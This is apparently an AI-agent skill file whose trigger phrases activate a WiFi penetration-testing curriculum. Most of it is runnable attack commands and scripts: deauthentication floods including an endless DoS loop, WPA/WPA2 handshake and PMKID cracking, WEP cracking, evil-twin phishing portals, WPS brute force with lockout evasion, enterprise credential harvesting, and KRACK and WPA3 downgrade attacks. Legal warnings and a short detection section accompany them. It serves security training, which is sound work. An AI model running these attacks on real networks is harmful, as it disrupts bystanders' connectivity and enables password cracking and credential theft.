---
name: wireless-security-wifi-penetration-testing
description: Open study notes and hands-on labs for wireless security & WiFi penetration testing with aircrack-ng, covering 802.11, WEP/WPA/WPA2/WPA3 attacks
triggers:
  - "how do I crack WPA2 handshakes"
  - "setup monitor mode on wireless adapter"
  - "capture WPA handshake with airodump-ng"
  - "perform deauth attack with aireplay-ng"
  - "crack WEP encryption with aircrack-ng"
  - "setup evil twin access point"
  - "perform wireless penetration testing"
  - "analyze 802.11 packets with wireshark"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This project is a comprehensive, lab-driven curriculum for wireless security and WiFi penetration testing. It covers 802.11 standards, encryption protocols (WEP/WPA/WPA2/WPA3), monitor-mode capture, reconnaissance, traffic analysis, handshake cracking, rogue access points, wireless MITM attacks, and enterprise (EAP/RADIUS) assessment. The material is structured as hands-on study notes with reproducible command examples using the aircrack-ng suite and related tools on Kali Linux.

## Prerequisites

Before using these techniques, ensure:

- **Kali Linux** installed (bare-metal or VM with USB passthrough)
- **Injection-capable wireless adapter** (Atheros AR9271, Ralink RT3070/RT5372)
- **Legal authorization** — test only on networks you own or have explicit written permission to assess
- **Isolated RF lab** — deauth attacks and rogue APs disrupt all devices in range

## Core Tooling

The primary tools used throughout the curriculum:

- **aircrack-ng suite**: airodump-ng (capture), aireplay-ng (injection), aircrack-ng (cracking), airbase-ng (rogue AP)
- **hashcat**: GPU-accelerated WPA/WPA2 cracking
- **hcxdumptool / hcxtools**: PMKID capture and hash conversion
- **reaver / bully**: WPS PIN attacks
- **kismet**: Wireless IDS and sniffing
- **wireshark**: 802.11 packet analysis
- **hostapd / dnsmasq**: Rogue AP and evil twin setup
- **wifiphisher / wifipumpkin3**: Automated evil twin and captive portal

## Installation & Setup

### 1. Install Required Packages

```bash
# Update package list
sudo apt update

# Install aircrack-ng suite (usually preinstalled on Kali)
sudo apt install aircrack-ng

# Install additional wireless tools
sudo apt install hashcat hcxdumptool hcxtools reaver bully kismet wireshark

# Install rogue AP tools
sudo apt install hostapd dnsmasq wifiphisher

# Install optional advanced tools
sudo apt install wifipumpkin3 bettercap
```

### 2. Identify and Setup Wireless Adapter

```bash
# List wireless interfaces
iwconfig

# Check adapter chipset and driver
lsusb
lspci | grep -i wireless

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor mode (should show wlan0mon)
iwconfig

# Test packet injection capability
sudo aireplay-ng --test wlan0mon

# Expected output should show injection working and ACKs received
```

### 3. Set Regulatory Domain (Legal Compliance)

```bash
# Set regulatory domain (US example - use your country code)
sudo iw reg set US

# Verify
iw reg get

# Reduce TX power to minimum for isolated lab testing
sudo iwconfig wlan0mon txpower 0
```

## Phase 1: Reconnaissance & Discovery

### Scan for Access Points

```bash
# Start airodump-ng to scan all channels
sudo airodump-ng wlan0mon

# Scan specific channel (e.g., channel 6)
sudo airodump-ng --channel 6 wlan0mon

# Scan 5GHz band (channels 36-165)
sudo airodump-ng --band a wlan0mon

# Write capture to file
sudo airodump-ng --channel 6 --write capture wlan0mon
```

**Airodump-ng output columns:**
- **BSSID**: MAC address of AP
- **PWR**: Signal strength (closer to 0 is stronger)
- **Beacons**: Beacon frames sent
- **#Data**: Data packets captured
- **CH**: Channel
- **MB**: Max speed
- **ENC**: Encryption (OPN, WEP, WPA, WPA2)
- **CIPHER**: TKIP or CCMP
- **AUTH**: PSK or MGT (enterprise)
- **ESSID**: Network name

### Discover Hidden SSIDs

```bash
# Wait for client to connect (SSID will be revealed in probe requests)
sudo airodump-ng --channel 6 wlan0mon

# Force deauth to trigger reassociation (reveals hidden SSID)
# Replace BSSID with target AP and CLIENT with target device
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### Enumerate Clients

```bash
# Target specific AP and capture station (client) data
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF --write clients wlan0mon

# Use kismet for advanced enumeration
sudo kismet -c wlan0mon
# Access web interface at http://localhost:2501
```

## Phase 2: WPA/WPA2 Handshake Capture & Cracking

### Capture WPA/WPA2 Handshake

```bash
# Start capture on target AP's channel
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF --write handshake wlan0mon

# In another terminal, deauth a connected client to force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Or target specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message in airodump-ng
# Stop capture with Ctrl+C
```

### Verify Handshake Capture

```bash
# Check if handshake was captured
sudo aircrack-ng handshake-01.cap

# Look for "1 handshake" message
```

### Crack WPA/WPA2 with Aircrack-ng (Dictionary Attack)

```bash
# Crack using wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Target specific BSSID if multiple in capture
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Use custom wordlist
sudo aircrack-ng -w custom-wordlist.txt handshake-01.cap
```

### Crack WPA/WPA2 with Hashcat (GPU Acceleration)

```bash
# Convert .cap to hashcat format using aircrack-ng
sudo aircrack-ng handshake-01.cap -J handshake

# Or use cap2hccapx (deprecated, use hcxpcapngtool)
hcxpcapngtool -o handshake.hc22000 handshake-01.cap

# Crack with hashcat (mode 22000 for WPA/WPA2)
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# GPU-accelerated with optimizations
hashcat -m 22000 -w 3 -O handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked results
hashcat -m 22000 handshake.hc22000 --show
```

### PMKID Attack (Clientless WPA/WPA2)

```bash
# Capture PMKID using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Wait for PMKID capture (usually <60 seconds)
# Stop with Ctrl+C

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack PMKID
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Show results
hashcat -m 22000 pmkid.hc22000 --show
```

## Phase 3: WEP Cracking

### WEP Cracking (Passive - Requires ~50k-100k IVs)

```bash
# Start capture on WEP network
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF --write wep wlan0mon

# Wait until #Data reaches 50,000+ IVs

# Crack WEP key
sudo aircrack-ng wep-01.cap
```

### WEP Cracking (Active - ARP Replay Attack)

```bash
# Terminal 1: Start capture
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF --write wep wlan0mon

# Terminal 2: Fake authentication to AP
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Terminal 3: Wait for ARP packet, then replay it
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan0mon

# Watch #Data counter increase rapidly in Terminal 1
# Once ~50,000 IVs collected:

# Terminal 4: Crack
sudo aircrack-ng wep-01.cap
```

### WEP Cracking (Fragmentation Attack - No Client Needed)

```bash
# Fake authenticate
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Perform fragmentation attack to obtain PRGA XOR keystream
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF wlan0mon

# This creates fragment-*.xor file

# Forge ARP packet using PRGA
sudo packetforge-ng --arp -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 192.168.1.1 -l 192.168.1.100 -y fragment-*.xor -w arp-packet

# Inject forged packet
sudo aireplay-ng --interactive -r arp-packet wlan0mon

# Crack once IVs collected
sudo aircrack-ng wep-01.cap
```

## Phase 4: Deauthentication Attacks

### Basic Deauth Attack

```bash
# Deauth all clients from AP
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Send limited number of deauth packets
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Continuous Deauth (DoS)

```bash
# Infinite deauth loop
while true; do
    sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
    sleep 1
done
```

**Warning**: Deauthentication attacks are denial-of-service attacks and illegal against networks without authorization.

## Phase 5: Rogue Access Point (Evil Twin)

### Method 1: Manual Evil Twin with hostapd

Create hostapd configuration file `evil-twin.conf`:

```conf
interface=wlan0mon
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

Start the rogue AP:

```bash
# Disable monitor mode first
sudo airmon-ng stop wlan0mon

# Start hostapd
sudo hostapd evil-twin.conf

# In another terminal, configure DHCP with dnsmasq
# Create dnsmasq.conf
cat << EOF > dnsmasq.conf
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
EOF

# Configure interface
sudo ifconfig wlan0 192.168.10.1 netmask 255.255.255.0

# Start dnsmasq
sudo dnsmasq -C dnsmasq.conf -d

# Enable IP forwarding for MITM
sudo sysctl -w net.ipv4.ip_forward=1

# Setup iptables NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

### Method 2: Automated Evil Twin with Wifiphisher

```bash
# List available interfaces
sudo wifiphisher --list-interfaces

# Launch automated evil twin attack
sudo wifiphisher -i wlan0 -e "TargetNetwork" -p firmware-upgrade

# Available phishing scenarios:
# - firmware-upgrade: Fake router firmware update
# - network_manager_connect: Fake network connection request
# - oauth-login: Fake OAuth login page
```

### Method 3: WiFi Pumpkin 3 (Advanced Evil Twin Framework)

```bash
# Start WiFi Pumpkin 3
sudo wifipumpkin3

# Inside wp3 console:
set interface wlan0
set ssid FreeWiFi
set proxy noproxy
start
```

## Phase 6: WPS Attacks

### Scan for WPS-Enabled APs

```bash
# Scan for WPS
sudo wash -i wlan0mon

# Look for "WPS Locked: No" - these are vulnerable
```

### WPS PIN Brute Force with Reaver

```bash
# Basic reaver attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With delay to avoid lockout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5

# Resume previous session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -c 6 -s /root/reaver.session

# Use pixie dust attack (fast WPS vulnerability)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K
```

### WPS PIN Brute Force with Bully

```bash
# Basic bully attack
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Verbose output
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon -v 3

# Use known PIN
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -p 12345670 wlan0mon
```

## Phase 7: Enterprise WPA (EAP/RADIUS) Assessment

### Capture Enterprise Authentication

```bash
# Capture EAP handshake
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF --write enterprise wlan0mon

# Deauth to force EAP reauthentication
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Extract EAP Credentials from Capture

```bash
# Analyze with Wireshark
wireshark enterprise-01.cap

# Filter for EAP: eap
# Look for EAP-Identity responses containing usernames

# Extract RADIUS hashes for cracking
cat enterprise-01.cap | grep -i "EAP-Response/Identity"
```

### Setup Rogue EAP/RADIUS (Credential Harvesting)

Use `eaphammer` for automated evil twin with enterprise credential capture:

```bash
# Clone eaphammer
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer

# Install dependencies
./kali-setup

# Launch credential harvesting attack
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "CorpNetwork" --creds
```

## Phase 8: Packet Analysis with Wireshark

### Key Wireshark Filters for 802.11

```
# Display only beacon frames
wlan.fc.type_subtype == 0x08

# Display only data frames
wlan.fc.type == 2

# Display deauth frames
wlan.fc.type_subtype == 0x0c

# Display WPA handshakes
eapol

# Filter by BSSID
wlan.bssid == aa:bb:cc:dd:ee:ff

# Filter by SSID
wlan.ssid == "NetworkName"

# Display only encrypted data
wlan.fc.protected == 1

# Display probe requests (client scanning)
wlan.fc.type_subtype == 0x04
```

### Decrypt WPA/WPA2 Traffic in Wireshark

```
1. Edit → Preferences → Protocols → IEEE 802.11
2. Enable "Enable decryption"
3. Click "Edit" next to "Decryption keys"
4. Add key: wpa-psk or wpa-pwd
   - For wpa-psk: Enter raw 64-character hex PSK
   - For wpa-pwd: Enter "password:SSID"
5. Click OK
6. Reload capture file
```

## Phase 9: Advanced Attacks

### Krack Attack (Key Reinstallation)

```bash
# Clone krackattacks scripts
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# Install dependencies
sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome

# Test for KRACK vulnerability
cd krackattack
./krack-test-client.py

# Perform key reinstallation attack
sudo ./krack-all-zero-tk.py wlan0mon "TargetNetwork"
```

### WPA3 Dragonblood Attack

```bash
# Clone dragonslayer tools
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test for Dragonblood vulnerabilities
sudo ./dragonslayer.py wlan0mon

# Perform downgrade attack (force WPA3 to WPA2)
sudo ./dragonforce.py --downgrade -i wlan0mon --essid "TargetNetwork"
```

## Common Patterns & Best Practices

### Pre-Attack Checklist

```bash
#!/bin/bash
# wireless-pentest-setup.sh

# 1. Kill interfering processes
sudo airmon-ng check kill

# 2. Enable monitor mode
sudo airmon-ng start wlan0

# 3. Set regulatory domain
sudo iw reg set US

# 4. Reduce TX power for lab
sudo iwconfig wlan0mon txpower 0

# 5. Verify injection
sudo aireplay-ng --test wlan0mon

echo "Setup complete. Interface: wlan0mon"
```

### Post-Attack Cleanup

```bash
#!/bin/bash
# wireless-pentest-cleanup.sh

# 1. Stop monitor mode
sudo airmon-ng stop wlan0mon

# 2. Restart NetworkManager
sudo systemctl start NetworkManager

# 3. Clear iptables rules
sudo iptables -F
sudo iptables -t nat -F

# 4. Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

echo "Cleanup complete. Adapter returned to managed mode."
```

### Handshake Capture Automation

```bash
#!/bin/bash
# capture-handshake.sh

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
OUTPUT_FILE="$3"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ] || [ -z "$OUTPUT_FILE" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL> <OUTPUT_FILE>"
    exit 1
fi

# Start capture in background
sudo airodump-ng --channel "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" --write "$OUTPUT_FILE" wlan0mon &
AIRODUMP_PID=$!

# Wait 5 seconds for capture to start
sleep 5

# Send deauth packets
echo "Sending deauth to trigger handshake..."
sudo aireplay-ng --deauth 10 -a "$TARGET_BSSID" wlan0mon

# Wait 30 seconds for handshake
sleep 30

# Check if handshake captured
if sudo aircrack-ng "${OUTPUT_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
    echo "SUCCESS: Handshake captured!"
    kill $AIRODUMP_PID
    exit 0
else
    echo "FAILED: No handshake captured. Try again."
    kill $AIRODUMP_PID
    exit 1
fi
```

## Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Check if adapter supports monitor mode
iw list | grep -A 10 "Supported interface modes"

# Should see "* monitor" in output

# If not working, try manual method
sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up

# Verify
iwconfig wlan0
```

### Packet Injection Not Working

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# If failing, check driver
lsmod | grep -i 8812

# Update firmware
sudo apt update && sudo apt install firmware-realtek firmware-atheros

# Try different injection test
sudo aireplay-ng --test wlan1mon -i wlan0mon
```

### No Handshake Captured

```bash
# Ensure client is connected during deauth
# Verify in airodump-ng station list

# Try multiple deauth attempts
sudo aireplay-ng --deauth 50 -a AA:BB:CC:DD:EE:FF wlan0mon

# Use targeted deauth with client MAC
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Check capture file
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Hashcat Not Finding Hash

```bash
# Verify hash format
hcxpcapngtool --help | grep "hash modes"

# Convert again with verbose output
hcxpcapngtool -o handshake.hc22000 handshake-01.cap -v

# Check hash file
cat handshake.hc22000

# Should see format: WPA*02*PMK*BSSID*STA*ESSID*nonce...
```

### Rogue AP Clients Not Getting DHCP

```bash
# Check dnsmasq is running
sudo ps aux | grep dnsmasq

# Check interface IP
ip addr show wlan0

# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward
# Should be 1

# Check iptables rules
sudo iptables -t nat -L -v

# Restart dnsmasq with verbose logging
sudo dnsmasq -C dnsmasq.conf -d --log-queries
```

### WPS Attack Locked Out

```bash
# Wait for WPS lockout timer (usually 60 seconds - 5 minutes)
# Check lockout status
sudo wash -i wlan0mon

# Use longer delay between attempts
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 10 -T 0.5 -t 5

# Try MAC address spoofing to bypass lockout
sudo macchanger -r wlan0mon
```

## Security Considerations

**Legal Warning**: All techniques documented here are for authorized testing only. Unauthorized wireless attacks are illegal in most jurisdictions under computer fraud and telecommunications laws.

**Ethical Use**:
- Only test networks you own or have explicit written authorization to assess
- Maintain detailed engagement documentation and rules of engagement
- Isolate RF lab to prevent interference with neighboring networks
- Use minimum necessary transmission power
- Disable attacks immediately when testing completes

**Detection Indicators**:
- Monitor for deauthentication floods with WIDS (Kismet, Snort)
- Detect rogue APs with BSSID/channel monitoring
- Enable 802.11w (management frame protection) to prevent deauth attacks
- Implement WPA3 with SAE to mitigate KRACK/Dragonblood
- Monitor RADIUS logs for unusual EAP authentication failures

## Additional Resources

- **Official Documentation**: https://www.armourinfosec.com
- **Aircrack-ng Wiki**: https://aircrack-ng.org/doku.php
- **Hashcat Wiki**: https://hashcat.net/wiki/
- **802.11 Standards**: IEEE 802.11-2020 specification
- **OSWP Certification**: https://www.offensive-security.com/wireless-professional-oswp/

This skill provides the foundational knowledge and command patterns needed to assist developers and security professionals in wireless penetration testing using the aircrack-ng suite and related tools, following the structured curriculum from the armourinfosec/Wireless-Security-and-WiFi-Penetration-Testing project.
